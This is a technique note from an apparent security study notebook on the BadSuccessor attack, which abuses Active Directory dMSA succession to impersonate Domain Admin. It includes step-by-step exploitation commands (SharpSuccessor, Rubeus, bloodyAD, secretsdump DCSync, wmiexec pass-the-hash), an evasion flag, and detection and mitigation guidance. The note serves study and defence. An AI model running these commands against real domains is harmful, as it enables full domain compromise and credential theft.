---
title: "BadSuccessor Attack"
created: 2026-11-12
type: technique
tags: [technique, active-directory, privilege-escalation, windows, kerberos, dmsa]
---

# BadSuccessor Attack

A privilege escalation attack discovered by **Akamai researchers in 2025**. It abuses the dMSA succession mechanism to impersonate any account in the domain — including Domain Admin.

**What makes this unique:** This is not a software bug — it's a **design flaw**. The dMSA succession feature works exactly as Microsoft built it. It simply doesn't verify that the person setting up succession has any right to access the target account. As of mid-2025, **there is no patch from Microsoft**.

---

## Prerequisites

The only requirement: **CreateChild permission on any Organizational Unit (OU)**.

This is an extremely common delegation — IT helpdesk staff routinely have it so they can create user accounts, computer objects, or group policies. Other permissions that also work: GenericAll, WriteDACL, or WriteOwner on an OU.

See [[Organizational Units and DACLs]] for why these permissions are common and how to enumerate them.

---

## How It Works

1. **Create a dMSA object** in an OU where you have CreateChild
2. **Set `msDS-ManagedAccountPrecededByLink`** to point to the target account (e.g., `CN=Administrator,CN=Users,DC=domain,DC=local`)
3. **Set `msDS-DelegatedMSAState` to 2** — tells the DC "succession is already complete, don't question it"
4. **Request Kerberos tickets as the dMSA** — the DC sees the succession link, looks up the target account, and includes the target's Kerberos keys in the response
5. **Authenticate as the target** — you now have Administrator's keys and can access anything they can

The critical flaw is in step 4: the DC performs **no authorization check**. It doesn't verify that whoever created the dMSA had any right to access the target account's credentials.

See [[Managed Service Accounts]] for how dMSA succession is supposed to work legitimately.

---

## Reconnaissance

Before exploiting, find accounts with CreateChild (or GenericAll, WriteDACL, WriteOwner) on OUs.

### From Windows (PowerShell)

```powershell
# Using a dedicated script
Get-BadSuccessorOUPermissions.ps1

# Or manually reading DACLs on OUs
(Get-Acl "AD:\OU=TargetOU,DC=domain,DC=local").Access |
    Where-Object { $_.ActiveDirectoryRights -match 'CreateChild|GenericAll|WriteDacl|WriteOwner' }
```

### From Linux

**LDAP signing** is a common obstacle. Modern DCs (especially Server 2025) enforce it — all LDAP requests must be cryptographically signed. Raw `ldapsearch` and some Impacket tools (`impacket-dacledit`) fail with `strongerAuthRequired`. Tools like **nxc** and **bloodyAD** handle signing automatically.

```bash
# bloodyAD — find everything you can write/create
bloodyAD -d domain.local -u USER -p PASS --host DC-FQDN get writable --detail

# nxc — read DACLs on a specific OU
nxc ldap DC_IP -u USER -p PASS -d domain.local \
    -M daclread -o TARGET_DN="OU=SomeOU,DC=domain,DC=local" ACTION=read
```

Look for `dSA: CREATE_CHILD` on an OU — that's the permission that enables this attack.

See [[Enumeration & Reconnaissance]] for general AD enumeration tools and [[Organizational Units and DACLs]] for DACL details.

---

## Exploitation from Windows (SharpSuccessor + Rubeus)

### Step 1: Create the malicious dMSA

**SharpSuccessor** creates the dMSA and configures the succession link in one command:

```
SharpSuccessor.exe -dc DC-HOSTNAME -domain domain.local \
    -u USERNAME -p PASSWORD \
    -cn dmsa_name -ou "OU=SomeOU,DC=domain,DC=local" \
    -target "CN=Administrator,CN=Users,DC=domain,DC=local"
```

This creates a dMSA object, sets `msDS-ManagedAccountPrecededByLink` to Administrator, and sets `msDS-DelegatedMSAState` to 2.

### Step 2: Extract a TGT with Rubeus tgtdeleg

```
Rubeus.exe tgtdeleg
```

**The tgtdeleg trick:** You can't directly read your own TGT from memory — it's encrypted with a key you don't have access to. Rubeus works around this by **faking a Kerberos delegation request**. It tells the DC "I need to forward my TGT to another service." The DC responds with a copy of the TGT encrypted using a negotiated session key that Rubeus can read. It's a legitimate Kerberos protocol feature (unconstrained delegation) being abused to extract a credential you normally can't access directly.

See [[Credential Extraction & Abuse]] for more Rubeus capabilities.

### Step 3: Request a TGS as the dMSA

```
Rubeus.exe asktgs /ticket:<TGT> /service:krbtgt/domain.local /targetuser:dmsa_name$ /opsec
```

- `/ticket:<TGT>` — present the extracted TGT from step 2
- `/service:krbtgt/domain.local` — request from the KDC
- `/targetuser:dmsa_name$` — act as the dMSA (note the `$` suffix — see [[Managed Service Accounts]])
- `/opsec` — use AES encryption types that look normal and avoid detection

The DC processes this, sees the dMSA's succession link to Administrator, and includes **Administrator's Kerberos keys** (AES256, AES128, RC4) in the TGS response.

### Step 4: Get a service ticket with the stolen keys

```
Rubeus.exe asktgs /ticket:<TGS> /service:cifs/DC-HOSTNAME.domain.local /enctype:aes256 /key:<AES256_KEY>
```

Now requesting a CIFS (file sharing) service ticket for the DC, authenticating with Administrator's AES256 key. The DC sees a valid key and issues the ticket. You can now access the DC's admin shares — `\\DC\C$`, `\\DC\ADMIN$` — as Administrator.

For the full Kerberos authentication flow (TGT → TGS → service access), see [[Kerberos Authentication Flow]].

---

## Exploitation from Linux (bloodyAD + Impacket)

### Step 1: Create the dMSA with bloodyAD

```bash
bloodyAD -d domain.local -u USER -p PASS --host DC-FQDN add badSuccessor dmsa_name
```

This single command does everything SharpSuccessor does: creates the dMSA, sets the succession link (defaults to impersonating Administrator), and outputs:
- A `.ccache` file containing the dMSA's Kerberos TGT
- The target account's AES256, AES128, and RC4 keys directly

### ccache Files

On Windows, Kerberos tickets live in memory (managed by `lsass.exe`). On Linux, they're stored in **files** with a `.ccache` extension. The environment variable `KRB5CCNAME` tells all Kerberos-aware tools which file to use:

```bash
export KRB5CCNAME=dmsa_name_ts.ccache
```

This is the Linux equivalent of having a ticket cached in your Windows logon session. Any tool that accepts `-k -no-pass` flags will read credentials from this file instead of prompting for a password.

### Step 2: Get a CIFS service ticket

```bash
export KRB5CCNAME=dmsa_name_ts.ccache
getST.py -dc-ip DC_IP -spn 'cifs/DC-FQDN' 'domain.local/dmsa_name$' -k -no-pass
```

- `-spn 'cifs/DC-FQDN'` — the Service Principal Name identifying the file sharing service on the DC. SPNs use the format `service/hostname` — see [[Kerberos Authentication Flow]] for details
- `-k -no-pass` — authenticate via Kerberos using the ccache file, no password prompt
- The `$` in `dmsa_name$` is required — it's a machine/service account

This saves a new ccache file named `dmsa_name$.ccache` with the CIFS service ticket.

### Step 3: DCSync — dump all domain password hashes

```bash
export KRB5CCNAME=dmsa_name\$.ccache
secretsdump.py -k -no-pass 'dmsa_name$'@DC-FQDN
```

This performs a **DCSync attack** — abusing the Active Directory Directory Replication Service (DRSUAPI) to request every account's password hash. Because the dMSA has Administrator's privileges, the DC treats this as a legitimate replication request and hands over everything.

The output includes NTLM hashes for every domain account: Administrator, krbtgt, all service accounts, all users.

See [[Windows AD Privilege Escalation]] for a full explanation of DCSync and other domain escalation techniques.

### Step 4: Pass-the-Hash for a shell

```bash
wmiexec.py 'domain.local/administrator@DC_IP' -hashes :<NTLM_HASH>
```

Uses the extracted Administrator NTLM hash to get a shell on the DC — no password cracking needed. Windows NTLM authentication verifies the hash itself, not the password. See [[NTLM (NT LAN Manager)]] for how Pass-the-Hash works, and [[Remote Execution & Lateral Movement]] for wmiexec details.

**The Linux path is more damaging** because DCSync extracts every account's hash. Even after the dMSA is discovered and deleted, the attacker still has all the hashes — persistent access to every account unless passwords are rotated domain-wide.

---

## Detection

- **Monitor dMSA creation** — any new `msDS-DelegatedManagedServiceAccount` object, especially with `msDS-DelegatedMSAState` already set to 2 (skipping the normal progression)
- **Audit OU permissions** — identify all non-admin accounts with CreateChild on any OU; these are the attack surface. See [[Organizational Units and DACLs]]
- **Watch succession links** — `msDS-ManagedAccountPrecededByLink` pointing to high-value accounts (Administrator, Domain Admins, service accounts with elevated privileges) is always suspicious
- **DCSync detection** — monitor for DRSUAPI replication requests from non-DC machines. See [[Windows AD Privilege Escalation]]
- **Kerberos anomalies** — new machine accounts (names ending in `$`) that never existed before, suddenly requesting TGTs and TGS tickets for high-privilege targets

---

## Mitigation

As of mid-2025, **there is no patch from Microsoft**. This is a design flaw, not a software bug.

Current defenses:

1. **Restrict dMSA creation** — ensure only trusted administrators have CreateChild on OUs, or specifically deny creation of `msDS-DelegatedManagedServiceAccount` objects via the OU DACL
2. **Audit OU delegations** — review who has CreateChild, GenericAll, WriteDACL, or WriteOwner on every OU in the domain
3. **Don't deploy dMSA yet** — if you don't need the succession feature, the safest move is to not enable it until Microsoft addresses the flaw. gMSAs work well for most use cases
4. **Monitor for new dMSA objects** — alert on creation of any dMSA, require approval workflows
5. **Limit replication rights** — restrict which accounts can perform DCSync (defense-in-depth — doesn't prevent the initial key theft but limits the blast radius)

---

## Related Notes

- [[Managed Service Accounts]]
- [[Organizational Units and DACLs]]
- [[Kerberos Authentication Flow]]
- [[Kerberos Authentication Attacks in Active Directory]]
- [[Credential Extraction & Abuse]]
- [[Windows AD Privilege Escalation]]
- [[NTLM (NT LAN Manager)]]
- [[Remote Execution & Lateral Movement]]
- [[Enumeration & Reconnaissance]]
